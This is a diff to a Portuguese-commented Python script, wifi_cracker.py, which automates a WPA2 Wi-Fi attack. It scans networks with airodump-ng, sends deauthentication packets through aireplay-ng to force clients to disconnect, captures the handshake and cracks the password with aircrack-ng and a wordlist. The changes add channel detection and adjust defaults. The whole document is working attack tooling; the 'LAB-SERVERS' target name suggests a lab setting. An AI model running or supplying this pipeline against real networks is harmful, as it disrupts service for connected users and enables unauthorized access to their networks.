@@ -5,16 +5,16 @@ Captura handshake e cracka password "Cibersegura"
 
 Uso:
     # Pipeline completo (scan + captura + crack)
-    python wifi_cracker.py --network "LAB-SERVERS"
+    python wifi_cracker.py --network "LAB-SERVERS" --interface wlan00mon
 
     # Capturar handshake
-    python wifi_cracker.py --capture --network "LAB-SERVERS" --interface wlan0mon
+    python wifi_cracker.py --capture --network "LAB-SERVERS" --interface wlan00mon
 
     # Deauth standalone (forçar reconexão)
-    python wifi_cracker.py --deauth --bssid AA:BB:CC:DD:EE:FF --interface wlan0mon
+    python wifi_cracker.py --deauth --bssid AA:BB:CC:DD:EE:FF --interface wlan00mon
 
-    # Crackar handshake já capturado
-    python wifi_cracker.py --crack hashes/wifi_sample.hc22000
+    # Crackar handshake já capturado (.cap do aircrack-ng)
+    python wifi_cracker.py --crack captures/handshake_LAB-SERVERS.cap
 """
 
 import subprocess
@@ -30,7 +30,7 @@ from typing import Optional, Dict, List
 class WiFiCracker:
     """Cracka redes WPA2 usando aircrack-ng"""
     
-    def __init__(self, monitor_iface: str = "wlan0mon", output_dir: str = "results"):
+    def __init__(self, monitor_iface: str = "wlan00mon", output_dir: str = "captures"):
         self.monitor_iface = monitor_iface
         self.output_dir = output_dir
         Path(output_dir).mkdir(exist_ok=True)
@@ -38,13 +38,16 @@ class WiFiCracker:
         
     def check_monitor_mode(self) -> bool:
         """Verifica se interface está em modo monitor"""
-        # iw pode estar em /usr/sbin (não no PATH default)
         iw_paths = ["/usr/sbin/iw", "/sbin/iw", "/usr/bin/iw", "iw"]
         iw_cmd = None
         for p in iw_paths:
-            if os.path.isfile(p) or p == "iw":
+            if p == "iw" or os.path.isfile(p):
                 iw_cmd = p
                 break
+
+        if iw_cmd is None:
+            print(f"[!] iw não encontrado. Instalar: sudo apt install iw")
+            return False
 
         try:
             result = subprocess.run(
@@ -113,6 +116,7 @@ class WiFiCracker:
                             essid = ','.join(parts[13:]).strip()
                             networks.append({
                                 'bssid': parts[0].strip(),
+                                'channel': parts[3].strip(),
                                 'power': parts[8].strip(),
                                 'beacons': parts[9].strip(),
                                 'data': parts[10].strip(),
@@ -124,30 +128,44 @@ class WiFiCracker:
             if networks:
                 print(f"[+] {len(networks)} redes encontradas")
                 for net in networks:
-                    print(f"    {net['essid']:24} | {net['bssid']} | {net['security']}")
+                    print(f"    {net['essid']:24} | {net['bssid']} | Ch {net['channel']:>2} | {net['security']}")
         except FileNotFoundError:
             print(f"[!] Ficheiro CSV não encontrado: {csv_file}")
         
         return networks
     
-    def capture_handshake(self, bssid: str, essid: str, timeout: int = 120) -> bool:
-        """Captura WPA handshake forcando reconexo"""
+    def capture_handshake(self, bssid: str, essid: str, channel: str = None, timeout: int = 120) -> Optional[str]:
+        """Captura WPA handshake forçando reconexão.
+        
+        Returns:
+            Path to .cap file on success, None on failure.
+        """
         print(f"[*] Capturando handshake para {essid} ({bssid})...")
         
         capture_file = f"{self.output_dir}/handshake_{essid}_{self.timestamp}"
         
         try:
-            # Start airodump-ng para capturar
+            # Build airodump-ng command
+            airodump_cmd = [
+                "sudo", "airodump-ng",
+                "--bssid", bssid,
+                "-w", capture_file,
+                self.monitor_iface
+            ]
+            if channel:
+                airodump_cmd.insert(3, "-c")
+                airodump_cmd.insert(4, channel)
+
             airodump = subprocess.Popen(
-                ["sudo", "airodump-ng", "-c", "6", "-d", bssid, "-w", capture_file, self.monitor_iface],
+                airodump_cmd,
                 stdout=subprocess.DEVNULL,
                 stderr=subprocess.DEVNULL
             )
             
-            # Esperar um pouco antes de forar desconexo
+            # Esperar antes de forçar desconexão
             time.sleep(5)
             
-            # Forar desconexo com aireplay-ng (deauth attack)
+            # Forçar desconexão com aireplay-ng (deauth attack)
             print(f"[*] Enviando deauth packets (desligando clientes)...")
             for i in range(3):
                 subprocess.run(
@@ -167,10 +185,10 @@ class WiFiCracker:
                 if os.path.exists(cap_file):
                     # Verificar se tem handshake
                     result = subprocess.run(
-                        ["aircrack-ng", cap_file, "-l", "-"],
+                        ["aircrack-ng", cap_file],
                         capture_output=True,
                         text=True,
-                        timeout=5
+                        timeout=10
                     )
                     if "1 handshake" in result.stdout or "WPA" in result.stdout:
                         print(f"[+] Handshake capturado!")
@@ -286,21 +304,22 @@ def main():
     )
     parser.add_argument("--network", help="Nome da rede (ESSID)")
     parser.add_argument("--bssid", help="BSSID do access point")
-    parser.add_argument("--interface", default="wlan0mon", help="Interface monitor (default: wlan0mon)")
+    parser.add_argument("--interface", default="wlan00mon", help="Interface monitor (default: wlan00mon)")
     parser.add_argument("--wordlist", default="wordlists/custom.txt", help="Wordlist de passwords")
     parser.add_argument("--timeout", type=int, default=120, help="Timeout para captura (seg)")
-    parser.add_argument("--output", default="results", help="Diretório de output")
+    parser.add_argument("--output", default="captures", help="Diretório de output")
 
     # Modos de operação
     group = parser.add_mutually_exclusive_group()
     group.add_argument("--scan-only", action="store_true", help="Apenas scanear redes")
     group.add_argument("--capture", action="store_true", help="Capturar handshake (scan + deauth + captura)")
-    group.add_argument("--crack", metavar="HASH_FILE", help="Crackar handshake já capturado")
+    group.add_argument("--crack", metavar="CAP_FILE", help="Crackar handshake já capturado (.cap)")
     group.add_argument("--deauth", action="store_true", help="Enviar deauth packets (forçar reconexão)")
     group.add_argument("--full", action="store_true", help="Pipeline completo (scan + capture + crack)")
 
     parser.add_argument("--deauth-count", type=int, default=5, help="Deauth packets por ronda (default: 5)")
     parser.add_argument("--deauth-rounds", type=int, default=3, help="Número de rondas de deauth (default: 3)")
+    parser.add_argument("--channel", "-c", help="Canal WiFi (auto-detectado pelo scan se omitido)")
     parser.add_argument("--ssid", help="Alias para --network")
 
     args = parser.parse_args()
@@ -323,7 +342,7 @@ def main():
 
         bssid = args.bssid or "00:00:00:00:00:00"
         essid = args.network or "unknown"
-        print(f"[*] Cracking WPA2 com hashcat mode 22000...")
+        print(f"[*] Cracking WPA2 com aircrack-ng...")
         print(f"[*] Wordlist: {args.wordlist}")
         password = cracker.crack_password(args.crack, bssid, essid, args.wordlist)
 
@@ -339,7 +358,7 @@ def main():
     if not cracker.check_monitor_mode():
         print("[!] Ative monitor mode primeiro:")
         print("    sudo airmon-ng check kill")
-        print("    sudo airmon-ng start wlan0")
+        print(f"    sudo airmon-ng start {args.interface.replace('mon', '')}")
         sys.exit(1)
 
     print("[+] Interface em modo monitor!")
@@ -380,7 +399,9 @@ def main():
         if not target:
             sys.exit(1)
 
-        cap_file = cracker.capture_handshake(target['bssid'], target['essid'], timeout=args.timeout)
+        cap_file = cracker.capture_handshake(target['bssid'], target['essid'],
+                                              channel=args.channel or target.get('channel'),
+                                              timeout=args.timeout)
         if cap_file:
             print(f"\n[+] HANDSHAKE CAPTURADO! → {cap_file}")
         else:
@@ -395,7 +416,7 @@ def main():
         if networks:
             print(f"\n[+] {len(networks)} redes encontradas:\n")
             for i, net in enumerate(networks, 1):
-                print(f"  {i}. {net['essid']:20} | {net['bssid']} | {net['security']}")
+                print(f"  {i}. {net['essid']:20} | {net['bssid']} | Ch {net['channel']:>2} | {net['security']}")
         else:
             print("[-] Nenhuma rede encontrada")
         return
@@ -421,7 +442,7 @@ def main():
 
     print(f"\n[+] {len(networks)} redes encontradas:\n")
     for i, net in enumerate(networks, 1):
-        print(f"  {i}. {net['essid']:20} | {net['bssid']} | {net['security']}")
+        print(f"  {i}. {net['essid']:20} | {net['bssid']} | Ch {net['channel']:>2} | {net['security']}")
 
     target = _find_network(networks, args)
     if not target:
@@ -434,7 +455,9 @@ def main():
     print("=" * 60)
     print("FASE 2: CAPTURA DE HANDSHAKE")
     print("=" * 60)
-    cap_file = cracker.capture_handshake(target['bssid'], target['essid'], timeout=args.timeout)
+    cap_file = cracker.capture_handshake(target['bssid'], target['essid'],
+                                          channel=args.channel or target.get('channel'),
+                                          timeout=args.timeout)
     if not cap_file:
         print("\n[!] Falha ao capturar handshake")
         sys.exit(1)
